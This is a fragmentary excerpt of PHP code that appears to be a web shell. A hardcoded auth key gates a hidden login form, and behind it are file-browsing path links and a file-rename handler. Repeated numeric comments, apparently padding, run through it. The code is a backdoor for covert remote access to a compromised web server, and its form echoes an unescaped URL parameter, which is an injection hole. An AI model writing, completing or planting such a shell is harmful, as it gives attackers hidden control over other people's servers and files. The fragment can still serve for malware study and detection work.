...
$auth_key = "a45a69744db747301a5112a5d01bc514";
...
$pass = false;
if (isset($_COOKIE['pw_name_41931'])) {
    if(($_COOKIE['pw_name_41931']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_41931'])) {
        if(($_POST['pw_name_41931']) == $auth_key) {
            setcookie("pw_name_41931", $_POST['pw_name_41931']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_41931' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774546673 1724682774588748 1724682774232161 1724682774844024
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774546673 1724682774588748 1724682774232161 1724682774844024
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774546673 1724682774588748 1724682774232161 1724682774844024
            $name = PATH . "/" . $_GET['r'];
